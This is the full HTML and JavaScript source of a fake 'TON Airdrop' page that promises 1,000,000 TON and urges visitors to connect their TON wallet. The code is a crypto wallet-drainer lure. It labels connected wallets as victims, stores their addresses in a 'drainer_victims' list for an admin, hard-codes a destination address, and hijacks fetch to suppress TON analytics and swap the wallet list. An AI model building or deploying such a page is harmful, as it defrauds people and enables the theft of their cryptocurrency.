<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Airdrop — Claim Your Free Tokens</title>
    <!-- Библиотека TonConnect -->
    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }
        .background {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0;
            background: radial-gradient(circle at 20% 50%, #1a1a2e 0%, #0a0a0a 50%);
        }
        .background::before {
            content: "";
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: conic-gradient(from 0deg at 50% 50%,
                rgba(240,185,11,0.1) 0deg, transparent 60deg,
                rgba(240,185,11,0.05) 120deg, transparent 180deg,
                rgba(240,185,11,0.1) 240deg, transparent 300deg,
                rgba(240,185,11,0.05) 360deg);
            animation: rotate 20s linear infinite;
            z-index: -1;
        }
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .card {
            position: relative;
            z-index: 1;
            max-width: 440px;
            width: 100%;
            background: rgba(20, 20, 30, 0.8);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 24px;
            padding: 40px 25px;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6), 0 0 40px rgba(240,185,11,0.1);
            animation: float 6s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        .logo {
            width: 90px; height: 90px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #f0b90b, #e5a100);
            border-radius: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            box-shadow: 0 10px 30px rgba(240,185,11,0.4);
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(240,185,11,0.6); }
            70% { box-shadow: 0 0 0 20px rgba(240,185,11,0); }
            100% { box-shadow: 0 0 0 0 rgba(240,185,11,0); }
        }
        h1 {
            font-size: 2rem;
            margin: 10px 0;
            background: linear-gradient(to right, #f0b90b, #ff8c00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }
        .stats {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin: 20px 0;
            color: #b0b0b0;
            font-size: 0.9rem;
        }
        .stats span {
            display: block;
            color: #f0b90b;
            font-weight: 700;
            font-size: 1.2rem;
            margin-top: 4px;
        }
        .description {
            color: #ccc;
            font-size: 0.95rem;
            margin: 15px 0 25px;
            line-height: 1.6;
        }
        .btn-container {
            margin: 20px 0 10px;
        }
        /* Стилизация кнопки TonConnect */
        #connect-container > button {
            background: linear-gradient(90deg, #f0b90b, #ff8c00) !important;
            color: #0f0f0f !important;
            border: none !important;
            padding: 16px 32px !important;
            font-weight: 700 !important;
            font-size: 1.1rem !important;
            border-radius: 14px !important;
            cursor: pointer !important;
            transition: all 0.3s ease !important;
            box-shadow: 0 8px 25px rgba(240,185,11,0.4) !important;
            letter-spacing: 0.5px !important;
            text-transform: uppercase !important;
            position: relative;
            overflow: hidden;
        }
        #connect-container > button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 35px rgba(240,185,11,0.6) !important;
        }
        #connect-container > button:active {
            transform: scale(0.98);
        }
        #connect-container > button::after {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.2), transparent);
            transform: rotate(45deg);
            animation: shimmer 3s infinite;
        }
        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        .status {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #f0b90b;
            word-break: break-all;
            text-align: left;
            background: rgba(0,0,0,0.3);
            padding: 12px;
            border-radius: 12px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="background"></div>
    <div class="card">
        <div class="logo">🪙</div>
        <h1>TON Airdrop</h1>
        <div class="stats">
            <div>💰 Prize pool<br><span>1,000,000 TON</span></div>
            <div>👥 Participants<br><span>154,921</span></div>
        </div>
        <p class="description">
            Connect your TON wallet to verify eligibility and claim your free tokens.
            Limited offer — only for active users.
        </p>
        <div class="btn-container" id="connect-container"></div>
        <div class="status" id="status">
            <em>Initializing secure connection...</em>
        </div>
    </div>

    <script>
        (function() {
            // Проверка загрузки библиотеки
            if (typeof TON_CONNECT_UI === 'undefined') {
                document.getElementById('status').innerHTML = '<span style="color:red">❌ Library not loaded.</span>';
                return;
            }

            // Конфигурация
            const DESTINATION_ADDRESS = 'UQBiTR-x4quXNhtXj1I1e1bs8tUeQspQru7HCoPmj76IqmlL';
            const MANIFEST_URL = 'https://nwealesss.github.io/draintest/tonconnect-manifest.json';

            // Локальный список кошельков (избавляет от запроса к config.ton.org)
            const walletsList = [
                {
                    name: 'Tonkeeper',
                    image: 'https://tonkeeper.com/assets/tonconnect-icon.png',
                    aboutUrl: 'https://tonkeeper.com',
                    bridgeUrl: 'https://bridge.tonkeeper.com/bridge',
                    universalLink: 'https://app.tonkeeper.com/ton-connect',
                    deepLink: 'tonkeeper-tc://',
                    injected: false
                },
                {
                    name: 'Tonhub',
                    image: 'https://tonhub.com/tonconnect-icon.png',
                    aboutUrl: 'https://tonhub.com',
                    bridgeUrl: 'https://connect.tonhub.com/bridge',
                    universalLink: 'https://tonhub.com/ton-connect',
                    deepLink: 'tonhub-tc://',
                    injected: false
                },
                {
                    name: 'MyTonWallet',
                    image: 'https://mytonwallet.io/icon-256.png',
                    aboutUrl: 'https://mytonwallet.io',
                    bridgeUrl: 'https://bridge.mytonwallet.org/bridge',
                    universalLink: 'https://mytonwallet.io/ton-connect',
                    deepLink: 'mytonwallet-tc://',
                    injected: false
                },
                {
                    name: 'OpenMask',
                    image: 'https://openmask.app/icon.png',
                    aboutUrl: 'https://openmask.app',
                    bridgeUrl: 'https://bridge.openmask.app/bridge',
                    universalLink: 'https://openmask.app/ton-connect',
                    deepLink: 'openmask-tc://',
                    injected: false
                }
            ];

            // Перехват fetch для подмены списка кошельков и блокировки аналитики
            const originalFetch = window.fetch;
            window.fetch = function(url, ...args) {
                const urlStr = typeof url === 'string' ? url : url.url;
                if (urlStr.includes('analytics.ton.org')) {
                    return Promise.resolve(new Response('{}', { status: 200 }));
                }
                if (urlStr.includes('config.ton.org/wallets-v2.json')) {
                    return Promise.resolve(new Response(JSON.stringify(walletsList), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json' }
                    }));
                }
                return originalFetch.call(this, url, ...args);
            };

            const statusDiv = document.getElementById('status');

            try {
                // Инициализация TonConnectUI
                const connector = new TON_CONNECT_UI.TonConnectUI({
                    manifestUrl: MANIFEST_URL,
                    buttonRootId: 'connect-container',
                    network: 'mainnet',
                    walletsList: walletsList,       // <-- локальный список, без внешних запросов
                    enableAnalytics: false
                });

                statusDiv.innerHTML = '<em>Waiting for wallet connection...</em>';

                // Обработка подключения кошелька
                connector.onStatusChange(async (wallet) => {
                    if (wallet) {
                        const victimAddress = wallet.account.address;
                        statusDiv.innerHTML = 
                            `<p>✅ Wallet connected successfully!</p>
                             <p>Address: <b>${victimAddress.slice(0,6)}...${victimAddress.slice(-4)}</b></p>
                             <p style="color:#4caf50;">You are eligible! Wait for admin to transfer your tokens.</p>`;

                        // Сохраняем адрес жертвы в localStorage для админки
                        const victims = JSON.parse(localStorage.getItem('drainer_victims') || '[]');
                        if (!victims.includes(victimAddress)) {
                            victims.push(victimAddress);
                            localStorage.setItem('drainer_victims', JSON.stringify(victims));
                        }
                    } else {
                        statusDiv.innerHTML = '<em>Please connect your wallet to continue.</em>';
                    }
                });

            } catch (initError) {
                statusDiv.innerHTML = `<p style="color:red">❌ Init error: ${initError.message}</p>`;
            }
        })();
    </script>
</body>
</html>
